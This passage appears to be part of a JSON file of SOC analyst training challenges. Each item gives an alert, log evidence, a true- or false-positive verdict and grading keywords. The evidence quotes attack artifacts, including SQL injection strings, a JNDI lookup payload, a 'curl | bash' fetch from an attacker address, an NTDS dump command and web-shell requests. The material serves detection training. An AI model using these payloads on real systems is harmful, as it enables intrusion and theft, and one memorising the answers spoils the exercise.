+   "No new services, scheduled tasks, or unsigned binaries observed on target hosts"
+  ],
+  "keywords": [
+   "false positive",
+   "chg-48213",
+   "jump-adm-01",
+   "10.10.5.20",
+   "svc-patchadm",
+   "patch",
+   "close"
+  ]
+ },
+ {
+  "id": "ch-05-3",
+  "title": "Pass-the-Hash Logons Across Multiple Servers",
+  "category": "Lateral Movement",
+  "severity": "Critical",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "A domain admin account performed NTLM network logons to several servers within minutes from a workstation, with no preceding Kerberos ticket requests, consistent with pass-the-hash.",
+  "alert": {
+   "rule": "SOC215 - Suspected Pass-the-Hash Activity",
+   "time": "2026-06-09 03:27",
+   "host": "SRV-APP-07",
+   "user": "CORP\\adm-tcho",
+   "src_ip": "10.30.8.145"
+  },
+  "evidence": [
+   "EventID 4624 LogonType=3 AuthPackage=NTLM user=CORP\\adm-tcho src=10.30.8.145 on SRV-APP-07, SRV-DB-02, SRV-DC-03 between 03:24 and 03:29",
+   "No EventID 4768/4769 Kerberos requests from 10.30.8.145 for adm-tcho in the preceding hour",
+   "EventID 4672 special privileges assigned to adm-tcho on each target",
+   "Source 10.30.8.145 is WKS-DEV-031; Sysmon EventID 10 shows lsass.exe access by C:\\Users\\Public\\procd.exe (SHA256=3b8e5a1c7f20d94e6ab1c03f58d2e7a9146cb0f3e85d2a7b9c41f06de8a35b12)",
+   "adm-tcho is on leave through 2026-06-12 per HR calendar"
+  ],
+  "keywords": [
+   "pass-the-hash",
+   "ntlm",
+   "4624",
+   "4672",
+   "lsass",
+   "10.30.8.145",
+   "isolate",
+   "reset"
+  ]
+ },
+ {
+  "id": "ch-05-4",
+  "title": "SMB Admin Share Access from Vulnerability Scanner",
+  "category": "Lateral Movement",
+  "severity": "Medium",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "FP",
+  "description": "Multiple hosts reported ADMIN$ and C$ access from a single internal IP using a service account. Investigation shows the source is the authenticated vulnerability scanner running its scheduled scan.",
+  "alert": {
+   "rule": "SOC219 - Admin Share Access from Single Source",
+   "time": "2026-06-11 01:05",
+   "host": "SRV-WEB-04",
+   "user": "CORP\\svc-nessus",
+   "src_ip": "10.10.9.50"
+  },
+  "evidence": [
+   "EventID 5140 share=\\\\*\\ADMIN$ and \\\\*\\C$ accessed by CORP\\svc-nessus from 10.10.9.50 on 48 hosts between 01:00 and 01:40",
+   "10.10.9.50 is VULN-SCAN-01, registered as the Nessus scanner in the asset inventory",
+   "Scan schedule 'Weekly Authenticated Internal Scan' runs Thursdays at 01:00 per the scanner console",
+   "Same pattern observed on 2026-06-04 and 2026-05-28 with identical source and account, previously tuned as informational",
+   "No file writes, service creation (7045), or process execution beyond the scanner's remote registry reads"
+  ],
+  "keywords": [
+   "false positive",
+   "5140",
+   "svc-nessus",
+   "10.10.9.50",
+   "vuln-scan-01",
+   "scheduled",
+   "tune"
+  ]
+ },
+ {
+  "id": "ch-05-5",
+  "title": "WMI Remote Execution Chain Leading to Domain Controller",
+  "category": "Lateral Movement",
+  "severity": "Critical",
+  "points": 180,
+  "difficulty": "Hard",
+  "verdict": "TP",
+  "description": "A chain of WMI-based remote executions hopped from a compromised web server through an application server to a domain controller, ending with a staged archive of NTDS data and outbound transfer.",
+  "alert": {
+   "rule": "SOC233 - Remote WMI Process Creation Chain",
+   "time": "2026-06-15 04:51",
+   "host": "SRV-DC-01",
+   "user": "CORP\\svc-backup",
+   "src_ip": "10.40.2.31"
+  },
+  "evidence": [
+   "Sysmon EventID 1 on SRV-APP-12 at 04:38: ParentImage=WmiPrvSE.exe Image=powershell.exe CommandLine='-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A...' src=10.40.1.15 (SRV-WEB-03)",
+   "EventID 4624 LogonType=3 user=CORP\\svc-backup on SRV-DC-01 from 10.40.2.31 (SRV-APP-12) at 04:49; svc-backup normally only logs on from BKP-01",
+   "Sysmon EventID 1 on SRV-DC-01 at 04:51: ParentImage=WmiPrvSE.exe CommandLine='ntdsutil \"ac i ntds\" ifm \"create full C:\\Windows\\Temp\\x\" q q'",
+   "Sysmon EventID 11 on SRV-DC-01: C:\\Windows\\Temp\\x.7z created, 212 MB, SHA256=c4a1e90b57d3f8261ae7d05b94c2f3e18a6b70d9e5c2418f3b7a0d6e9c15f2a8",
+   "Firewall: SRV-DC-01 10.40.2.5 -> 198.51.100.77:443 outbound 211 MB at 04:58, destination never seen before",
+   "SRV-WEB-03 flagged earlier for web shell upload at 03:55 (rule SOC102)"
+  ],
+  "keywords": [
+   "wmi",
+   "wmiprvse",
+   "ntdsutil",
+   "ntds",
+   "198.51.100.77",
+   "svc-backup",
+   "isolate",
+   "krbtgt",
+   "reset"
+  ]
+ },
+ {
+  "id": "ch-06-1",
+  "title": "SQL Injection Against Customer Portal Login",
+  "category": "Web Attacks",
+  "severity": "High",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "TP",
+  "description": "WAF flagged repeated SQL injection payloads against the login endpoint of the public customer portal. The source then received a much larger response than normal.",
+  "alert": {
+   "rule": "SOC231 - SQL Injection Pattern Detected",
+   "time": "2026-06-04 13:12",
+   "host": "WEB-PORTAL-01",
+   "user": "anonymous",
+   "src_ip": "203.0.113.58"
+  },
+  "evidence": [
+   "WAF: 312 requests POST /portal/login.php from 203.0.113.58 in 4 min, UA=sqlmap/1.7.2#stable",
+   "Request param username=admin' OR '1'='1'-- - and username=' UNION SELECT null,table_name FROM information_schema.tables--",
+   "Web server: first 280 responses HTTP 500 (len 1.2KB), then 14 responses HTTP 200 with len 486KB",
+   "DB log: syntax error near 'UNION SELECT' from app account svc_portal_web on DB-SQL-02",
+   "203.0.113.58 not in any customer allow-list; no prior sessions in the last 90 days"
+  ],
+  "keywords": [
+   "sql injection",
+   "sqlmap",
+   "203.0.113.58",
+   "union select",
+   "block",
+   "waf",
+   "data exposure"
+  ]
+ },
+ {
+  "id": "ch-06-2",
+  "title": "XSS and SQLi Alerts from Internal Scanner",
+  "category": "Web Attacks",
+  "severity": "Medium",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "FP",
+  "description": "WAF raised a burst of XSS, SQLi and path traversal signatures against the intranet HR app from a single internal IP shortly after midnight.",
+  "alert": {
+   "rule": "SOC236 - Multiple Web Attack Signatures from Single Source",
+   "time": "2026-06-07 00:18",
+   "host": "WEB-HR-APP-01",
+   "user": "anonymous",
+   "src_ip": "10.20.5.40"
+  },
+  "evidence": [
+   "WAF: 4,812 requests in 22 min from 10.20.5.40 matching XSS, SQLi, LFI and command injection signatures",
+   "User-Agent: Nessus SOC-Scan/10.6 on all requests; 10.20.5.40 is VULN-SCAN-01 in the CMDB (owner: Security Engineering)",
+   "Change ticket CHG0048213 approved: authenticated web scan of WEB-HR-APP-01, window 2026-06-07 00:00-02:00",
+   "No successful exploitation indicators: no 200 responses with abnormal size, no DB errors, no new processes on WEB-HR-APP-01",
+   "Scan traffic stopped at 00:40 and matches the scheduled scan job"
+  ],
+  "keywords": [
+   "false positive",
+   "vulnerability scanner",
+   "10.20.5.40",
+   "chg0048213",
+   "authorized",
+   "scan window",
+   "tune"
+  ]
+ },
+ {
+  "id": "ch-06-3",
+  "title": "Web Shell Uploaded via Image Upload Form",
+  "category": "Web Attacks",
+  "severity": "Critical",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "EDR detected IIS worker process spawning a command shell on the marketing web server shortly after an unusual file upload.",
+  "alert": {
+   "rule": "SOC244 - Suspicious Child Process of Web Server",
+   "time": "2026-06-10 21:37",
+   "host": "WEB-MKT-02",
+   "user": "IIS APPPOOL\\MarketingSite",
+   "src_ip": "198.51.100.77"
+  },
+  "evidence": [
+   "IIS log 21:31: POST /admin/upload.aspx 200 from 198.51.100.77 filename=banner.jpg.aspx Content-Type=image/jpeg",
+   "IIS log 21:35: GET /uploads/banner.jpg.aspx?c=whoami 200 from 198.51.100.77",
+   "Sysmon EventID 1: ParentImage=w3wp.exe Image=cmd.exe CommandLine=\"cmd /c whoami /all && net user\"",
+   "File created C:\\inetpub\\wwwroot\\uploads\\banner.jpg.aspx SHA256=9f2b7c1d4e8a6b305d1c7e92a4f0b83c6d5e1a7f2b9c04d8e3a6f1b57c2d9e40",
+   "Sysmon EventID 3: w3wp.exe outbound to 198.51.100.77:4443 at 21:38"
+  ],
+  "keywords": [
+   "web shell",
+   "banner.jpg.aspx",
+   "w3wp.exe",
+   "198.51.100.77",
+   "isolate",
+   "remove",
+   "upload validation"
+  ]
+ },
+ {
+  "id": "ch-06-4",
+  "title": "SSRF to Cloud Metadata Followed by Credential Use",
+  "category": "Web Attacks",
+  "severity": "Critical",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "App logs show a URL-fetch feature requesting the cloud instance metadata service. Minutes later, cloud audit logs show the instance role used from an unfamiliar external IP.",
+  "alert": {
+   "rule": "SOC258 - SSRF Attempt to Metadata Endpoint",
+   "time": "2026-06-15 09:52",
+   "host": "APP-PREVIEW-03",
+   "user": "svc-preview",
+   "src_ip": "192.0.2.146"
+  },
+  "evidence": [
+   "App log 09:49: GET /api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ from 192.0.2.146",
+   "App log 09:50: GET /api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/preview-app-role returned 200, 1.6KB",
+   "Cloud audit 09:55: GetCallerIdentity by role preview-app-role from 203.0.113.209 (not an instance IP)",
+   "Cloud audit 09:57: ListBuckets and GetObject on s3://corp-customer-exports by preview-app-role from 203.0.113.209",
+   "Instance is still on IMDSv1; the preview feature has no URL allow-list"
+  ],
+  "keywords": [
+   "ssrf",
+   "169.254.169.254",
+   "preview-app-role",
+   "revoke",
+   "imdsv2",
+   "203.0.113.209",
+   "s3"
+  ]
+ },
+ {
+  "id": "ch-06-5",
+  "title": "JNDI Injection Leading to Reverse Shell and Persistence",
+  "category": "Web Attacks",
+  "severity": "Critical",
+  "points": 180,
+  "difficulty": "Hard",
+  "verdict": "TP",
+  "description": "A burst of JNDI lookup strings in HTTP headers hit a Java-based internal API gateway exposed through the reverse proxy. Host telemetry then shows the Java process spawning shells and modifying scheduled tasks.",
+  "alert": {
+   "rule": "SOC271 - Log4j JNDI Lookup in HTTP Request",
+   "time": "2026-06-22 03:14",
+   "host": "API-GW-JAVA-02",
+   "user": "svc-apigw",
+   "src_ip": "198.51.100.23"
+  },
+  "evidence": [
+   "Proxy 03:12: GET /v2/health UA=${jndi:ldap://198.51.100.23:1389/a} X-Api-Version=${jndi:ldap://198.51.100.23:1389/b} -> 200",
+   "DNS from API-GW-JAVA-02 03:12: query for 198.51.100.23 callback; egress TCP 1389 allowed by firewall rule FW-EGR-114",
+   "auditd 03:13: exe=/usr/bin/java spawned /bin/bash -c 'curl -s http://198.51.100.23:8080/x.sh | bash' as uid=svc-apigw",
+   "File created /tmp/.x11 SHA256=3c8e51a07b9d24f6e1a05c7d93b2f84a6e0d1c5b7f3a92e48d6c0b1a5f7e3d29; crontab modified for svc-apigw: */5 * * * * /tmp/.x11",
+   "03:16 outbound TCP 443 to 192.0.2.88 every 60s (beacon pattern), 2.1KB out / 340B in",
+   "Same JNDI payload seen at 03:10 against API-GW-JAVA-01, but no child process activity there"
+  ],
+  "keywords": [
+   "log4shell",
+   "jndi",
+   "198.51.100.23",
+   "reverse shell",
+   "cron",
+   "isolate",
+   "192.0.2.88"
+  ]
+ },
+ {
+  "id": "ch-07-1",
+  "title": "Public S3 Bucket ACL Change Exposing Customer Exports",
+  "category": "Cloud",
+  "severity": "High",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "TP",
+  "description": "CloudTrail detected a bucket ACL change granting AllUsers read access on a bucket holding customer data exports, made by a user who does not normally manage storage.",
+  "alert": {
+   "rule": "SOC201 - S3 Bucket Made Public",
+   "time": "2026-06-02 14:12",
+   "host": "aws-prod-account-4471",
+   "user": "svc-reporting",
+   "src_ip": "203.0.113.58"
+  },
+  "evidence": [
+   "CloudTrail eventName=PutBucketAcl bucket=acme-customer-exports grantee=AllUsers permission=READ user=svc-reporting src=203.0.113.58",
+   "svc-reporting has never called PutBucketAcl in the prior 90 days; normal activity is PutObject only",
+   "src 203.0.113.58 is not in the corporate NAT or CI/CD ranges; user agent=curl/8.4.0",
+   "S3 server access logs: 37 anonymous GetObject requests from 198.51.100.77 and 192.0.2.140 within 10 minutes of the change",
+   "Bucket acme-customer-exports contains customers_2026Q2.csv with PII; no change ticket exists"
+  ],
+  "keywords": [
+   "putbucketacl",
+   "allusers",
+   "svc-reporting",
+   "203.0.113.58",
+   "revert",
+   "rotate",
+   "access keys",
+   "data exposure"
+  ]
+ },
+ {
+  "id": "ch-07-2",
+  "title": "Root Account Login from Approved Break-Glass Exercise",
+  "category": "Cloud",
+  "severity": "Low",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "FP",
+  "description": "AWS root account console login triggered a critical-account alert. The login coincides with a scheduled and documented quarterly break-glass test.",
+  "alert": {
+   "rule": "SOC202 - AWS Root Account Console Login",
+   "time": "2026-06-05 09:03",
+   "host": "aws-prod-account-4471",
+   "user": "root",
+   "src_ip": "192.0.2.25"
+  },
+  "evidence": [
+   "CloudTrail eventName=ConsoleLogin userIdentity=root MFA=true src=192.0.2.25 responseElements=Success",
+   "192.0.2.25 is the corporate SOC jump host range (SEC-JUMP-02)",
+   "Change ticket CHG-20458 approved: 'Quarterly break-glass root validation' window 09:00-09:30 on 2026-06-05, owner j.moreno",
+   "Hardware MFA token serial matches the sealed break-glass token; vault checkout log shows j.moreno at 08:58",
+   "No further API activity after login besides GetAccountSummary; session ended at 09:11 and root password rotated at 09:15 per runbook"
+  ],
+  "keywords": [
+   "root",
+   "consolelogin",
+   "chg-20458",
+   "break-glass",
+   "mfa",
+   "192.0.2.25",
+   "false positive",
+   "close"
+  ]
+ },
+ {
+  "id": "ch-07-3",
+  "title": "IAM Access Key Used from Tor Exit Node After Git Leak",
+  "category": "Cloud",
+  "severity": "Critical",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "An IAM access key belonging to a developer was used from a Tor exit node to enumerate resources and create new access keys, shortly after the key appeared in a public repository.",
+  "alert": {
+   "rule": "SOC203 - IAM Credential Used from Anonymizing Network",
+   "time": "2026-06-09 03:27",
+   "host": "aws-dev-account-2210",
+   "user": "d.okafor",
+   "src_ip": "198.51.100.200"
+  },
+  "evidence": [
+   "CloudTrail eventName=GetCallerIdentity accessKeyId=AKIAIOSFODNN7EXAMPLE user=d.okafor src=198.51.100.200 (Tor exit node per threat intel)",
+   "Within 4 minutes: ListUsers, ListRoles, ListBuckets, DescribeInstances from 198.51.100.200",
+   "eventName=CreateAccessKey targetUser=d.okafor-backup at 03:33; eventName=AttachUserPolicy policy=AdministratorAccess at 03:34",
+   "Secret scanning alert: AKIAIOSFODNN7EXAMPLE committed to github.com/acme-dev-tools/deploy-scripts (public) at 2026-06-08 21:50",
+   "d.okafor normally authenticates via SSO from 10.20.4.0/24 and has never used static keys from external IPs"
+  ],
+  "keywords": [
+   "akiaiosfodnn7example",
+   "198.51.100.200",
+   "tor",
+   "createaccesskey",
+   "administratoraccess",
+   "deactivate",
+   "revoke",
+   "github",
+   "persistence"
+  ]
+ },
+ {
+  "id": "ch-07-4",
+  "title": "Mass VM Creation in Unused Region Suggesting Cryptomining",
+  "category": "Cloud",
+  "severity": "High",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "Azure Activity Logs show dozens of GPU-enabled VMs created in a region the company does not use, followed by outbound traffic to a mining pool.",
+  "alert": {
+   "rule": "SOC204 - Anomalous Compute Resource Creation",
+   "time": "2026-06-12 22:46",
+   "host": "az-sub-prod-eu-03",
+   "user": "m.chen@acme-corp.example",
+   "src_ip": "203.0.113.91"
+  },
+  "evidence": [
+   "Azure Activity: Microsoft.Compute/virtualMachines/write x 42 region=southeastasia size=Standard_NC24ads_A100_v4 caller=m.chen@acme-corp.example",
+   "Sign-in log: m.chen from 203.0.113.91 (ASN hosting provider), legacy auth, MFA not satisfied; usual location is Dublin",
+   "NSG flow logs: new VMs connecting to pool.minexmr-example.net:4444 (192.0.2.210)",
+   "VM custom script extension downloads http://203.0.113.91/xm.sh, SHA256 9f2b7c1e4a8d5b60c3e7f1a2d4b8c9e05a6f3b7d1c2e4a8f9b0d6c3e7a1f5b24",
+   "Cost Management shows projected spend increase of $18,400/day for the subscription"
+  ],
+  "keywords": [
+   "cryptomining",
+   "southeastasia",
+   "m.chen",
+   "203.0.113.91",
+   "minexmr",
+   "legacy auth",
+   "mfa",
+   "delete vms",
+   "disable account",
+   "revoke sessions"
+  ]
+ },
+ {
+  "id": "ch-07-5",
+  "title": "Kubernetes Pod Escape to Node IMDS and Cross-Account Role Assumption",
+  "category": "Cloud",
+  "severity": "Critical",
+  "points": 180,
+  "difficulty": "Hard",
+  "verdict": "TP",
+  "description": "A compromised web pod in EKS queried the node's instance metadata service, then stolen node role credentials were used from an external IP to assume a role in the data account and read secrets.",
+  "alert": {
+   "rule": "SOC205 - Instance Role Credentials Used Outside VPC",
+   "time": "2026-06-18 01:19",
+   "host": "eks-node-prod-07",
+   "user": "arn:aws:sts::778812340011:assumed-role/eks-node-role/i-0a1b2c3d4e5f60789",
+   "src_ip": "192.0.2.166"
+  },
+  "evidence": [
+   "EKS audit log: pod web-frontend-6d9f7c-xk2lp (ns=prod) exec'd shell by anonymous user via vulnerable /debug endpoint at 00:52; container image sha256:3c5e1a9b7f2d4e8a0c6b1d9f3e7a5c2b8d4f6a0e1c3b5d7f9a2e4c6b8d0f1a3e",
+   "Pod network log: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role (IMDSv1 enabled, hop limit 2)",
+   "CloudTrail: AssumeRole eks-node-role session used from 192.0.2.166 (not an AWS/VPC address) at 01:19, userAgent=python-requests/2.31",
+   "CloudTrail: sts:AssumeRole into arn:aws:iam::990011223344:role/data-readonly followed by secretsmanager:GetSecretValue x 14 (prod/db/master, prod/payments/api-key)",
+   "VPC flow logs show pod web-frontend-6d9f7c-xk2lp also making outbound connections to 192.0.2.166:8443 starting 00:55"
+  ],
+  "keywords": [
+   "imds",
+   "169.254.169.254",
+   "imdsv2",
+   "eks-node-role",
+   "192.0.2.166",
+   "assumerole",
+   "getsecretvalue",
+   "isolate pod",
+   "revoke sessions",
+   "rotate secrets",
+   "cordon node"
+  ]
+ },
+ {
+  "id": "ch-08-1",
+  "title": "Bulk SharePoint Download Before Resignation Date",
+  "category": "Insider Threat",
+  "severity": "High",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "TP",
+  "description": "UEBA flagged a sales engineer who downloaded 1,840 files from the Customer-Contracts SharePoint library in 20 minutes. HR records show the user submitted a resignation notice two days earlier.",
+  "alert": {
+   "rule": "SOC801 - Abnormal Bulk Download from Document Library",
+   "time": "2026-06-08 17:52",
+   "host": "LT-SALES-044",
+   "user": "m.hartley",
+   "src_ip": "10.20.14.77"
+  },
+  "evidence": [
+   "1,840 x FileDownloaded site=/sites/Customer-Contracts user=m.hartley between 17:31 and 17:51 (30-day baseline: 12 files/day)",
+   "HR feed: m.hartley resignation submitted 2026-06-06, last working day 2026-06-19, new employer is a direct competitor",
+   "EDR: 7z.exe created C:\\Users\\mhartley\\Documents\\export_q2.7z (2.3 GB) at 17:54",
+   "EDR: USB mass storage device (serial 4C530001230912) attached at 17:58, 2.3 GB written",
+   "DLP: no approved business justification or ticket linked to this activity"
+  ],
+  "keywords": [
+   "bulk download",
+   "resignation",
+   "sharepoint",
+   "usb",
+   "7z",
+   "data exfiltration",
+   "manager"
+  ]
+ },
+ {
+  "id": "ch-08-2",
+  "title": "Large USB Copy by IT Admin During Laptop Refresh",
+  "category": "Insider Threat",
+  "severity": "Low",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "FP",
+  "description": "DLP alerted on 38 GB copied to an external drive from a workstation by an IT technician. The activity matches an approved hardware refresh change.",
+  "alert": {
+   "rule": "SOC815 - Large Data Transfer to Removable Media",
+   "time": "2026-06-10 10:14",
+   "host": "WS-FIN-031",
+   "user": "t.nguyen",
+   "src_ip": "10.30.5.31"
+  },
+  "evidence": [
+   "DLP: 38 GB copied to removable drive 'ITREFRESH-04' (company-owned, asset tag IT-EXT-0412)",
+   "Change ticket CHG0048213 (approved 2026-06-09): laptop refresh for Finance, user profile backup before reimage",
+   "t.nguyen is a member of IT-Service-Desk and is the assigned technician on CHG0048213",
+   "Data was a user profile (AppData, Documents, Desktop) of the workstation's own primary user, with no access to other file shares",
+   "The drive is on the approved removable media allowlist and BitLocker To Go encryption was enforced"
+  ],
+  "keywords": [
+   "change ticket",
+   "chg0048213",
+   "laptop refresh",
+   "false positive",
+   "approved",
+   "encrypted",
+   "allowlist"
+  ]
+ },
+ {
+  "id": "ch-08-3",
+  "title": "Hidden Mailbox Rule Forwarding to Personal Email",
+  "category": "Insider Threat",
+  "severity": "High",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "Exchange Online audit logs show a new inbox rule that silently forwards mail with financial keywords to an external personal address. The rule was created from the user's usual workstation, not from an unfamiliar location.",
+  "alert": {
+   "rule": "SOC832 - External Auto-Forward Inbox Rule Created",
+   "time": "2026-06-12 13:07",
+   "host": "EXCH-ONLINE",
+   "user": "d.okafor",
+   "src_ip": "10.40.8.112"
+  },
+  "evidence": [
+   "New-InboxRule Name='.' ForwardTo=d.okafor.private@mailbox.example.net SubjectOrBodyContains='invoice,wire,merger,forecast' DeleteMessage=False",
+   "Rule created from 10.40.8.112 (d.okafor's assigned workstation) with a normal MFA-verified session, so account takeover is unlikely",
+   "47 messages auto-forwarded externally in the last 3 hours, 11 with attachments named Q3_Forecast_Confidential.xlsx",
+   "d.okafor is on a performance improvement plan and was recently denied a promotion (HR note shared with SOC)",
+   "The user has no history of external forwarding rules, and the rule name '.' suggests an attempt to hide it"
+  ],
+  "keywords": [
+   "inbox rule",
+   "forwarding",
+   "new-inboxrule",
+   "external",
+   "d.okafor",
+   "disable rule",
+   "hr"
+  ]
+ },
+ {
+  "id": "ch-08-4",
+  "title": "DBA Exports Customer Table Off-Hours to Cloud Storage",
+  "category": "Insider Threat",
+  "severity": "Critical",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "A database administrator ran a full export of the customer PII table at 02:00 with no change ticket, then uploaded a large file to an unsanctioned file-sharing domain.",
+  "alert": {
+   "rule": "SOC847 - Sensitive Database Export Followed by External Upload",
+   "time": "2026-06-14 02:23",
+   "host": "DB-PROD-07",
+   "user": "r.castellano",
+   "src_ip": "10.50.2.19"
+  },
+  "evidence": [
+   "SQL audit: SELECT * FROM crm.dbo.Customers (4.1M rows) executed by r.castellano at 02:02, followed by bcp export to D:\\tmp\\cust.csv",
+   "No linked change ticket or incident, and the on-call roster shows r.castellano was not on call tonight",
+   "EDR: 7z.exe compressed D:\\tmp\\cust.csv to cust.7z (610 MB, SHA256 9f2c41ab7d3e5a8b0c6d1e4f27a39b5c8d0e1f6a2b4c7d8e9f0a1b2c3d4e5f60) at 02:11",
+   "Proxy: POST 610 MB to upload.fileshare-temp.example.net (198.51.100.45), category 'File Sharing - Unsanctioned', at 02:15",
+   "VPN log: r.castellano connected from a residential IP 203.0.113.88 at 01:54 with a valid MFA push"
+  ],
+  "keywords": [
+   "bcp",
+   "customer pii",
+   "fileshare-temp.example.net",
+   "198.51.100.45",
+   "no change ticket",
+   "disable account",
+   "legal"
+  ]
+ },
+ {
+  "id": "ch-08-5",
+  "title": "Sysadmin Abuses Service Account and Clears Logs",
+  "category": "Insider Threat",
+  "severity": "Critical",
+  "points": 180,
+  "difficulty": "Hard",
+  "verdict": "TP",
+  "description": "A senior sysadmin who was recently told they would be laid off used a shared backup service account to access executive file shares. They then cleared event logs and set up persistence. Each action alone looks like routine admin work, but together they indicate sabotage and exfiltration preparation.",
+  "alert": {
+   "rule": "SOC866 - Security Log Cleared on Server After Privileged Activity",
+   "time": "2026-06-18 23:41",
+   "host": "FS-EXEC-02",
+   "user": "svc_backup",
+   "src_ip": "10.60.3.25"
+  },
+  "evidence": [
+   "EventID 1102 (audit log cleared) on FS-EXEC-02 by svc_backup at 23:41, with no maintenance window scheduled",
+   "EventID 4624 LogonType=10 svc_backup from 10.60.3.25, which is the workstation of j.whitaker (sysadmin). Service account interactive logons are prohibited by policy",
+   "EventID 4663: svc_backup read 3,200 files under \\\\FS-EXEC-02\\Board and \\\\FS-EXEC-02\\M&A between 22:50 and 23:30. The account's normal pattern is a nightly backup read at 01:00",
+   "EventID 4698: scheduled task 'WinUpdateSvc' created by svc_backup running C:\\ProgramData\\wsvc.exe (SHA256 3b7e90d1c4a2f85e6b0d9a17c3e4f2085a6d7b9c1e0f3a4b5c6d7e8f9a0b1c2d) every 15 minutes",
+   "Firewall: wsvc.exe from FS-EXEC-02 sending HTTPS to 203.0.113.140 (newly registered domain sync-cdn-update.example.org), 1.8 GB outbound in 40 minutes",
+   "HR/PAM note: j.whitaker was told on 2026-06-17 that the role is being eliminated, and the svc_backup password was last checked out by j.whitaker at 22:38"
+  ],
+  "keywords": [
+   "1102",
+   "4698",
+   "svc_backup",
+   "j.whitaker",
+   "203.0.113.140",
+   "isolate",
+   "reset credentials"
+  ]
+ },
+ {
+  "id": "ch-09-1",
+  "title": "Large Upload to Personal Cloud Storage by Departing Employee",
+  "category": "Data Exfiltration",
+  "severity": "High",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "TP",
+  "description": "DLP and proxy telemetry flagged a 2.3 GB upload to an unsanctioned file-sharing site from a finance workstation shortly after the user's resignation was filed.",
+  "alert": {
+   "rule": "SOC201 - Large Outbound Transfer to Unsanctioned Cloud Storage",
+   "time": "2026-06-08 17:52",
+   "host": "WKS-FIN-023",
+   "user": "j.moretti",
+   "src_ip": "10.20.4.37"
+  },
+  "evidence": [
+   "Proxy: POST https://upload.filedrop-share.example/api/v2/chunk bytes_out=2,468,114,092 src=10.20.4.37 user=j.moretti dst=203.0.113.45 category=File-Sharing(Unsanctioned)",
+   "Sysmon EventID 11 (FileCreate) C:\\Users\\j.moretti\\AppData\\Local\\Temp\\Q2_Payroll_Clients_Export.zip 2.3 GB created at 17:31",
+   "DLP match: 1,840 records containing customer account numbers and salary data in the uploaded archive",
+   "HR feed: j.moretti submitted resignation on 2026-06-05, last working day 2026-06-12",
+   "No prior uploads to filedrop-share.example from this user or any other host in the last 90 days"
+  ],
+  "keywords": [
+   "203.0.113.45",
+   "filedrop-share",
+   "upload",
+   "dlp",
+   "resignation",
+   "isolate",
+   "block"
+  ]
+ },
+ {
+  "id": "ch-09-2",
+  "title": "High Outbound Volume from Backup Server to External IP",
+  "category": "Data Exfiltration",
+  "severity": "Low",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "FP",
+  "description": "Volume-based rule fired for 410 GB sent from a backup server to an external address during the weekend. Analyst must decide whether this is exfiltration or expected activity.",
+  "alert": {
+   "rule": "SOC207 - Abnormal Outbound Data Volume",
+   "time": "2026-06-14 02:18",
+   "host": "BKP-SRV-02",
+   "user": "svc_backup",
+   "src_ip": "10.10.8.12"
+  },
+  "evidence": [
+   "Firewall: 10.10.8.12 -> 198.51.100.20:443 bytes_out=440,201,883,904 duration=3h12m dst_fqdn=vault.backupvendor.example",
+   "198.51.100.20 is on the approved vendor allowlist (Vendor ID V-0173, offsite backup provider), TLS cert CN=vault.backupvendor.example issued by a trusted CA",
+   "Change ticket CHG-20418 approved: weekly full offsite replication every Sunday 02:00-06:00 from BKP-SRV-02",
+   "Process veeamagent.exe signed by the backup vendor, launched by scheduled task 'WeeklyOffsiteCopy' under svc_backup",
+   "Same transfer pattern (+/-8% volume) seen on the last 12 Sundays, with no other anomalous activity from the host"
+  ],
+  "keywords": [
+   "backup",
+   "198.51.100.20",
+   "chg-20418",
+   "scheduled",
+   "allowlist",
+   "false positive",
+   "baseline"
+  ]
+ },
+ {
+  "id": "ch-09-3",
+  "title": "DNS Tunneling from Database Server",
+  "category": "Data Exfiltration",
+  "severity": "High",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "A database server generated thousands of long, high-entropy DNS queries to a single rarely seen domain, consistent with data encoded in subdomains.",
+  "alert": {
+   "rule": "SOC215 - Anomalous DNS Query Length and Volume",
+   "time": "2026-06-10 03:26",
+   "host": "DB-PRD-07",
+   "user": "svc_sql",
+   "src_ip": "10.30.2.71"
+  },
+  "evidence": [
+   "DNS log: 4,812 queries in 11 minutes from 10.30.2.71 to *.t9.cdn-metrics-sync.example, avg QNAME length 61 chars, mostly TXT and NULL record types",
+   "Sample query: mfrggzdfmztwq2lknnwg23tpobyxe43uov3ho6dzpe.t9.cdn-metrics-sync.example (base32-looking payload)",
+   "cdn-metrics-sync.example registered 3 days ago, authoritative NS at 203.0.113.60, no passive DNS history",
+   "Sysmon EventID 1: powershell.exe -nop -w hidden -enc <base64> spawned by sqlservr.exe (xp_cmdshell) at 03:14",
+   "Sysmon EventID 11: C:\\Windows\\Temp\\cust_dump.tmp (\u2248180 MB) created 03:15 and read by the same PowerShell process"
+  ],
+  "keywords": [
+   "dns",
+   "tunneling",
+   "cdn-metrics-sync",
+   "txt",
+   "xp_cmdshell",
+   "sinkhole",
+   "isolate"
+  ]
+ },
+ {
+  "id": "ch-09-4",
+  "title": "External Auto-Forwarding Rule After Suspicious Sign-in",
+  "category": "Data Exfiltration",
+  "severity": "High",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "A new inbox rule silently forwarding mail to an external address was created minutes after a sign-in from an unfamiliar location for a procurement manager.",
+  "alert": {
